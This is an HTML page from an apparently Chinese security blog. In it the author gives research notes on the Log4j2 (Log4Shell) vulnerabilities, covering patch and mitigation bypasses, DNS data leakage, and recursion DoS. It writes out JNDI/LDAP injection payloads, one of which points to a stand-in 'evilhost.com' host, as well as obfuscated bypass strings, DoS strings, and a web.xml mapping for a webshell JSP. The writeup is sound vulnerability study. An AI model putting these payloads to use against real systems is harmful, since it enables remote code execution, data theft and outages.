@@ -1,0 +1,408 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="dark"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"><title>闲聊log4j2 | H4ckbird's Blog</title><meta name="author" content="H4ckbird,stupidbird6379@gmail.com"><meta name="copyright" content="H4ckbird"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#0d0d0d"><meta name="description" content="Java文件系统">
+<meta property="og:type" content="article">
+<meta property="og:title" content="闲聊log4j2">
+<meta property="og:url" content="http://example.com/2022/01/19/%E9%97%B2%E8%B0%88log4j2/index.html">
+<meta property="og:site_name" content="H4ckbird&#39;s Blog">
+<meta property="og:description" content="Java文件系统">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/img/img1.jpg">
+<meta property="article:published_time" content="2022-01-19T13:16:05.000Z">
+<meta property="article:modified_time" content="2022-01-20T12:12:23.000Z">
+<meta property="article:author" content="H4ckbird">
+<meta property="article:tag" content="test image">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/img/img1.jpg"><link rel="shortcut icon" href="/img/1.jpg"><link rel="canonical" href="http://example.com/2022/01/19/%E9%97%B2%E8%B0%88log4j2/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="/pluginsSrc/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="/pluginsSrc/@fancyapps/ui/dist/fancybox.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"/search.xml","preload":true,"languages":{"hits_empty":"找不到您查询的内容：${query}"}},
+  translate: undefined,
+  noticeOutdate: {"limitDay":500,"position":"top","messagePrev":"It has been","messageNext":"days since the last update, the content of the article may be outdated."},
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '天',
+  date_suffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: {"limitCount":50,"languages":{"author":"作者: H4ckbird","link":"链接: ","source":"来源: H4ckbird's Blog","info":"著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。"}},
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  source: {
+    justifiedGallery: {
+      js: '/pluginsSrc/flickr-justified-gallery/dist/fjGallery.min.js',
+      css: '/pluginsSrc/flickr-justified-gallery/dist/fjGallery.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: '闲聊log4j2',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2022-01-20 20:12:23'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
+
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          if (t === 'dark') activateDarkMode()
+          else if (t === 'light') activateLightMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+    const detectApple = () => {
+      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+    })(window)</script><script src="/js/SAO-Notify.js" async></script><link rel="stylesheet" href="/css/card_botui.css" /><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/js-heo@1.0.11/mainColor/heoMainColor.css"><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/js-heo@1.0.11/poem/poem.css"><!-- hexo injector head_end start --><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/swiper/swiper-bundle.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/Zfour/Butterfly-card-history/baiduhistory/css/main.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/Zfour/Butterfly-double-row-display@1.00/cardlistpost.min.css"/>
+<style>#recent-posts > .recent-post-item >.recent-post-info > .article-meta-wrap > .tags:before {content:"\A";
+  white-space: pre;}#recent-posts > .recent-post-item >.recent-post-info > .article-meta-wrap > .tags > .article-meta__separator{display:none}</style>
+<link rel="stylesheet" href="https://cdn.cbd.int/hexo-butterfly-clock-anzhiyu@1.1.6/lib/clock.min.css" /><link rel="stylesheet" href="https://unpkg.zhimg.com/hexo-butterfly-footer-beautify@1.0.0/lib/runtime.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://unpkg.zhimg.com/hexo-butterfly-swiper/lib/swiper.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://npm.elemecdn.com/hexo-butterfly-swiper/lib/swiper.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://npm.elemecdn.com/hexo-butterfly-swiper/lib/swiperstyle.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.cbd.int/hexo-butterfly-wowjs/lib/animate.min.css" media="print" onload="this.media='screen'"><link rel="stylesheet" href="https://npm.elemecdn.com/hexo-filter-gitcalendar/lib/gitcalendar.css" media="print" onload="this.media='all'"><!-- hexo injector head_end end --><meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/atom.xml" title="H4ckbird's Blog" type="application/atom+xml">
+</head><body><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/1.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">57</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">5</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">9</div></a></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> 文章</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> 生活</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> 学习</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div><div class="menus_item"><a class="site-page" href="/bangumis/"><i class="fa-fw icon-bilibili1"></i><span> 追番</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('/img/img1.jpg')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">H4ckbird's Blog</a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> 文章</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> 生活</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> 学习</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div><div class="menus_item"><a class="site-page" href="/bangumis/"><i class="fa-fw icon-bilibili1"></i><span> 追番</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">闲聊log4j2</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2022-01-19T13:16:05.000Z" title="发表于 2022-01-19 21:16:05">2022-01-19</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2022-01-20T12:12:23.000Z" title="更新于 2022-01-20 20:12:23">2022-01-20</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">1.9k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>7分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="闲聊log4j2"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="闲谈log4j2"><a href="#闲谈log4j2" class="headerlink" title="闲谈log4j2"></a>闲谈log4j2</h1><h2 id="log4j2爆炸漏洞"><a href="#log4j2爆炸漏洞" class="headerlink" title="log4j2爆炸漏洞"></a>log4j2爆炸漏洞</h2><p>简单的说一下最近这个log4j2漏洞吧，这个漏洞自己也跟了有一段时间了。第一次在学长那听到了这个漏洞，当时只是跟但了jndi注入点并没有发现漏洞的入口，也就是${jndi:ldap://127.0.0.1/exp}.一方面是没有想到这个功能，但是之后感觉官方文档里面说了<a target="_blank" rel="noopener" href="https://logging.apache.org/log4j/2.x/manual/lookups.html#JndiLookup">文档</a>，可能是自己语文水平不太好。(有点吃亏。。。</p>
+<h2 id="挖掘新问题"><a href="#挖掘新问题" class="headerlink" title="挖掘新问题"></a>挖掘新问题</h2><p>然后就是复现漏洞。挖新的问题。当时第一时间感觉这个东西肯定有问题，第一时间就想到了dos。</p>
+<p><img src="https://user-images.githubusercontent.com/63966847/146644571-d87566e9-ac55-44f7-aaf3-0a64beb97b01.png" alt="image-20211218215051277"></p>
+<p>当时因为环境没有配置起就去睡觉了，当时已经是晚上的3点了。</p>
+<p>说一下我当时发现的dos问题大致是因为数组长度我们可以控制造成溢出。第二天中午我大哥就提交了dos漏洞。之后就没有管了。</p>
+<h2 id="绕过rc1"><a href="#绕过rc1" class="headerlink" title="绕过rc1"></a>绕过rc1</h2><p>在然后说一下绕过rc1吧这个东西虽然简单但是我调试了一下午，大概是因为对异常没有处理，也就是在catch中没有return，导致程序会继续执行。</p>
+<p><img src="https://user-images.githubusercontent.com/63966847/146644576-d80164ab-1879-4e01-a50e-626f1c99bf5e.png" alt="Q`X GHE7UL3 IBYUAB0EFW"></p>
+<p>所以绕过思路就直接让new url(name) 抛出异常就欧克。</p>
+<p>tips:和bypass7u21差不多。。。</p>
+<h2 id="修复问题"><a href="#修复问题" class="headerlink" title="修复问题"></a>修复问题</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">今天看陈师傅写的文章，也就是修复log4j的坑。</span><br><span class="line">在漏洞报出来的时候修复的方法是：</span><br><span class="line"></span><br><span class="line">1.设置配置文件参数 log4j2.formatMsgNoLookups=true,</span><br><span class="line">2.vm启动环境参数 -Dlog4j2.formatMsgNolookups=true,</span><br><span class="line">3,设置系统环境变量 FORMAT_MESSAGES_PATTERN_DISABLE_LOOKUPS 设置为true</span><br><span class="line">而这样的修复是打破这个判断</span><br></pre></td></tr></table></figure>
+<p><img src="https://user-images.githubusercontent.com/63966847/146644579-6ed47eaf-8666-42ed-be31-7a01d83d860c.png" alt="image-20211215142114290"></p>
+<p>认真看该代码其实在下面还有一个入口。</p>
+<p><img src="https://user-images.githubusercontent.com/63966847/146644583-ac2f76eb-028d-4afb-8f72-e5848746b49c.png" alt="image-20211215142251448"></p>
+<p>可以看到判断条件是 <strong>msg instanceof StringBuilderFormattable</strong></p>
+<p>所以可以走第二个入口就绕过了log4j2.formatMsgNoLookups=true的判断</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">log.printf(Level.ERROR,<span class="string">&quot;$&#123;jndi:ldap://127.0.0.1:2333&#125;&quot;</span>);</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s?__biz=MzIxNDAyNjQwNg==&amp;mid=2456098698&amp;idx=1&amp;sn=8c66b476cb303bdf413337bc5c92e127&amp;chksm=803c6643b74bef55d1606a424e555ef09e27b8736928acdca027332453c6d9e4d7a11d7e589d&amp;mpshare=1&amp;scene=23&amp;srcid=1215Twk8iymC8x9gXD72dMTK&amp;sharer_sharetime=1639550097318&amp;sharer_shareid=20feca07eb3065d70e5194c2cdd097b3#rd">https://mp.weixin.qq.com/s?__biz=MzIxNDAyNjQwNg==&amp;mid=2456098698&amp;idx=1&amp;sn=8c66b476cb303bdf413337bc5c92e127&amp;chksm=803c6643b74bef55d1606a424e555ef09e27b8736928acdca027332453c6d9e4d7a11d7e589d&amp;mpshare=1&amp;scene=23&amp;srcid=1215Twk8iymC8x9gXD72dMTK&amp;sharer_sharetime=1639550097318&amp;sharer_shareid=20feca07eb3065d70e5194c2cdd097b3#rd</a></p>
+<p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/vAE89A5wKrc-YnvTr0qaNg">https://mp.weixin.qq.com/s/vAE89A5wKrc-YnvTr0qaNg</a></p>
+</blockquote>
+<h2 id="信息泄露"><a href="#信息泄露" class="headerlink" title="信息泄露"></a>信息泄露</h2><p>信息泄露这个问题我在漏洞刚刚出来的那天晚上就想到了，只是对比rce，信息泄露就微不足道。因为log4j2支持很多协议 sys等等可以看到env等等这些的信息，然后通过dns带出来。</p>
+<p>不过值得说一下其中有一个思路通过ResourceBundleLookup类去获得读取项目中后缀为properties的配置文件，其中就可能有username/password。当时我是看到了只是不知道这个方法是干啥子的也没有去百度。。。哭死了。</p>
+<p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s?__biz=Mzg4OTExMjE2Mw==&amp;mid=2247483945&amp;idx=1&amp;sn=b15b68d95da83bb20f1b3496396f823a&amp;chksm=cff19125f88618338373a32f98be3d2a9497b464d6531658c2aa96f4872c23eed294441917b5&amp;mpshare=1&amp;scene=23&amp;srcid=1211aS0Tghr1agBnBRlwwGTw&amp;sharer_sharetime=1639232420884&amp;sharer_shareid=33a823b10ae99f33a60db621d83241cb#rd">https://mp.weixin.qq.com/s?__biz=Mzg4OTExMjE2Mw==&amp;mid=2247483945&amp;idx=1&amp;sn=b15b68d95da83bb20f1b3496396f823a&amp;chksm=cff19125f88618338373a32f98be3d2a9497b464d6531658c2aa96f4872c23eed294441917b5&amp;mpshare=1&amp;scene=23&amp;srcid=1211aS0Tghr1agBnBRlwwGTw&amp;sharer_sharetime=1639232420884&amp;sharer_shareid=33a823b10ae99f33a60db621d83241cb#rd</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/jona-test/p/11399218.html">https://www.cnblogs.com/jona-test/p/11399218.html</a></p>
+<p>更新 2021/12/24</p>
+<p>看了大哥4ra1n的文章 <a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/10659">https://xz.aliyun.com/t/10659</a></p>
+<p>其中学习了dns（DNS协议是属于JNDI协议的） 可以带出数据 nc -lvup 通过udp接</p>
+<p><img src="https://user-images.githubusercontent.com/63966847/147314294-222e4af5-98b3-4eac-863a-64316c775f91.png" alt="image"></p>
+<p>然后就是回显的问题，通过报错来回显，其中port本该是int如果给它无法转int的字符串就会抛出这里的信息(触发RuntimeException)，并且ignoreExceptions配置为false。触发RuntimeException()</p>
+<p>而NumberFormatException就是触发RuntimeException的子类。</p>
+<p>${jndi:ldap://x.x.x.x:${java:version}/xxx}</p>
+<h2 id="bypass"><a href="#bypass" class="headerlink" title="bypass"></a>bypass</h2><p>这个东西太多了，在tw一看就很多很多。一方面是因为一些协议可以返回输入的值比如：lower data</p>
+<p>还有一个bypass思路是因为执行解析log4j2中的${}问题。简单的说也是将${::-x}解析成x</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$&#123;jn$&#123;::-d&#125;i:ldap://127.0.0.1:8880/&#125;</span><br></pre></td></tr></table></figure>
+<h2 id="cve-dos"><a href="#cve-dos" class="headerlink" title="cve-dos"></a>cve-dos</h2><p>大哥成功获得apache的cve。<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/10670">https://xz.aliyun.com/t/10670</a></p>
+<p>简单的看了一下发现里面的思路和我不一样，大哥是想到了网络连接，也就可以存在一个网络超时的问题，而且log4j2支持递归解析。。所以就让他一直解析网络超时的ip…造成dos.</p>
+<p>在这个cve通报中发现存在rce?简单的看了一下，我的理解是因为配置文件配置的这一次解析问题,如下配置中就有$${}这样。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;Appenders&gt;</span><br><span class="line">    &lt;Console name=&quot;STDOUT&quot; target=&quot;SYSTEM_OUT&quot;&gt;</span><br><span class="line">        &lt;PatternLayout&gt;</span><br><span class="line">            &lt;pattern&gt;%d %p %c&#123;1.&#125; [%t] $$&#123;ctx:loginId&#125; %m%n&lt;/pattern&gt;</span><br><span class="line">        &lt;/PatternLayout&gt;</span><br><span class="line">    &lt;/Console&gt;</span><br><span class="line">&lt;/Appenders&gt;</span><br></pre></td></tr></table></figure>
+<p>而其中里面了ctx协议ContextMapLookup类，简单的说大概就是将我们解析的东西放到map里面然后在取出来。取出来之后在解析${xxxx}就造成了rce问题/dos问题。</p>
+<h2 id="bypass-2-15"><a href="#bypass-2-15" class="headerlink" title="bypass 2.15"></a>bypass 2.15</h2><p>昨天在tw上看到了bypass 2.15版本,这个东西还没有具体去复现。不过看了一下exp大致懂了。。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$&#123;jndi:ldap://127.0.0.1#evilhost.com:1389/exp&#125;</span><br></pre></td></tr></table></figure>
+<p>不过环境要求比较严格而且真实环境的rce可能比较可能。。。</p>
+<p>2021/12/20更新</p>
+<p>今天看到了大哥写的bypass 2.15 rce分析简单的记录一下 <a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/10689">https://xz.aliyun.com/t/10689</a></p>
+<p>利用条件</p>
+<p>1.开启lookup功能</p>
+<p>2.macos系统</p>
+<p>3.泛域名解析</p>
+<p>4.本地存在gadget</p>
+<p>该exp通过去绕过了ip限制并且可以解析远程恶意ip(macos系统</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$&#123;jndi:ldap://127.0.0.1#evilhost.com:1389/exp&#125;</span><br></pre></td></tr></table></figure>
+<p>然后去绕过ldap服务的限制。</p>
+<p><img src="https://user-images.githubusercontent.com/63966847/146754506-bccfb16a-57e0-40d6-be17-36cbe67705a7.png" alt="image-20211220183446609"></p>
+<p>正常情况是直接通过Reference去利用，不过这里不能使用Reference，所以就利用deserializeObject，其实就是bypass jdk8u191。满足本地存在gadget。只是需要把classname换成基本数据类型。去绕过<strong>if (!allowedClasses.contains(className))</strong></p>
+<p>也其实就是我们在了ldap的时候的思路 <strong>LDAP服务攻击一般是先测Reference再测deserializeObject</strong></p>
+<p><img src="https://user-images.githubusercontent.com/63966847/146754481-8d5aff45-fa12-4593-9165-ace4aa0257bd.png" alt="image-20211220183705875"></p>
+<h2 id="CVE-2021-45105"><a href="#CVE-2021-45105" class="headerlink" title="CVE-2021-45105"></a>CVE-2021-45105</h2><p>这个漏洞我看了下没有看太懂，也就不这么介绍了反正大概介绍递归解析的问题。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">$&#123;$&#123;::-$&#123;::-$$&#123;::-$&#125;&#125;&#125;&#125;</span><br><span class="line">|</span><br><span class="line">|</span><br><span class="line">$&#123;::-$&#123;::-$$&#123;::-$&#125;&#125;&#125;</span><br><span class="line">然后在 <span class="built_in">this</span>.substitute(event, bufName, <span class="number">0</span>, bufName.length());</span><br><span class="line">|</span><br><span class="line">|</span><br><span class="line">::-::-$$&#123;::-$&#125;</span><br><span class="line">然后在 <span class="built_in">this</span>.substitute(event, bufName, <span class="number">0</span>, bufName.length());</span><br><span class="line">|</span><br><span class="line">|</span><br><span class="line">::-$$&#123;::-$&#125;</span><br><span class="line">|</span><br><span class="line">|</span><br><span class="line">$&#123;::-$&#125;</span><br><span class="line">|</span><br><span class="line">|</span><br><span class="line">::-$ 会进入一个异常</span><br></pre></td></tr></table></figure>
+<p><img src="https://user-images.githubusercontent.com/63966847/146945232-9157632d-2463-4d2c-976d-544e49ff249c.png" alt="image"></p>
+<p><del>说不定其他解析表达式也存在。。。。</del></p>
+<p><a target="_blank" rel="noopener" href="https://www.zerodayinitiative.com/blog/2021/12/17/cve-2021-45105-denial-of-service-via-uncontrolled-recursion-in-log4j-strsubstitutor">https://www.zerodayinitiative.com/blog/2021/12/17/cve-2021-45105-denial-of-service-via-uncontrolled-recursion-in-log4j-strsubstitutor</a></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/apache/logging-log4j2/commit/806023265f8c905b2dd1d81fd2458f64b2ea0b5e#diff-3f056c67add25837df0d7d8b8ab22df492dc14e3c5bae5f2914e69ac8af8d5cc">https://github.com/apache/logging-log4j2/commit/806023265f8c905b2dd1d81fd2458f64b2ea0b5e#diff-3f056c67add25837df0d7d8b8ab22df492dc14e3c5bae5f2914e69ac8af8d5cc</a></p>
+<p>更新 2021/12/22</p>
+<p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s?__biz=MzU5MjEzOTM3NA==&amp;mid=2247490570&amp;idx=1&amp;sn=279f4c19c266dd2f443088e33786f867&amp;chksm=fe25190bc952901d1a754f78802b3dd1fd1d3107cd0d92f54b62c64797e966962427ca989126&amp;mpshare=1&amp;scene=23&amp;srcid=1222cs3lrxzG5cIJHSfdgcOe&amp;sharer_sharetime=1640169352847&amp;sharer_shareid=33a823b10ae99f33a60db621d83241cb#rd">https://mp.weixin.qq.com/s?__biz=MzU5MjEzOTM3NA==&amp;mid=2247490570&amp;idx=1&amp;sn=279f4c19c266dd2f443088e33786f867&amp;chksm=fe25190bc952901d1a754f78802b3dd1fd1d3107cd0d92f54b62c64797e966962427ca989126&amp;mpshare=1&amp;scene=23&amp;srcid=1222cs3lrxzG5cIJHSfdgcOe&amp;sharer_sharetime=1640169352847&amp;sharer_shareid=33a823b10ae99f33a60db621d83241cb#rd</a></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">在配置文件中配置：$$&#123;ctx:apiVersion&#125;   则输入 $&#123;$&#123;ctx:apiVersion&#125;&#125;或$&#123;$&#123;::-$&#123;::-$$&#123;::-aaa&#125;&#125;&#125;&#125;则可以造成递归dos</span><br><span class="line">在配置文件中配置：$&#123;ctx:apiVersion&#125;   则输入$&#123;$&#123;::-$&#123;::-$$&#123;::-dos&#125;&#125;&#125;&#125;则可以造成递归dos</span><br></pre></td></tr></table></figure>
+<h2 id="更新"><a href="#更新" class="headerlink" title="更新"></a>更新</h2><p>cve:<a target="_blank" rel="noopener" href="https://checkmarx.com/blog/cve-2021-44832-apache-log4j-2-17-0-arbitrary-code-execution-via-jdbcappender-datasource-element/">https://checkmarx.com/blog/cve-2021-44832-apache-log4j-2-17-0-arbitrary-code-execution-via-jdbcappender-datasource-element/</a></p>
+<p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s?__biz=Mzg4MzYxODA4Mw==&amp;mid=2247484028&amp;idx=1&amp;sn=5748c6b75530a786f1bf0622616413c6&amp;chksm=cf45fa30f83273269da4884f82c5d4ce43089d6ba8a7b6470e35f963d690ec781faa85ab48e1&amp;mpshare=1&amp;scene=23&amp;srcid=12298p7j6KLY39FVuwNzmFRD&amp;sharer_sharetime=1640749370687&amp;sharer_shareid=33a823b10ae99f33a60db621d83241cb#rd">聊聊配置文件 RCE 这件事</a></p>
+<p>不愧是师傅总结的不错，简单的说就是通过配置文件去rce.<br>突然又想到了一个：web.xml里面添加servlet去实现解析一句话。<br>访问/exp路由就会解析</p>
+<p><img src="https://user-images.githubusercontent.com/63966847/147626724-576ba23e-7fdf-4b73-b591-095af4578f8a.png" alt="image"></p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">servlet</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>xxx<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">jsp-file</span>&gt;</span>/WEB-INF/1.jsp<span class="tag">&lt;/<span class="name">jsp-file</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">servlet</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>xxx<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/exp<span class="tag">&lt;/<span class="name">url-patten</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">servlet-mapping</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<h2 id="总结一下"><a href="#总结一下" class="headerlink" title="总结一下"></a>总结一下</h2><p>主要是自己的问题，</p>
+<p>第一点是读文档的习惯少导致不理解其中的意思失去第一时间拥有exp</p>
+<p>第二点是自己没有考虑到dos中的网络连接超时问题。</p>
+<p>第三点是自己发现了ResourceBundleLookup类却不知道其意思导致失去新思路的发现。</p>
+<p>（如果官方在删除lookup功能我相信还会有更多的漏洞。。。。。。。。</p>
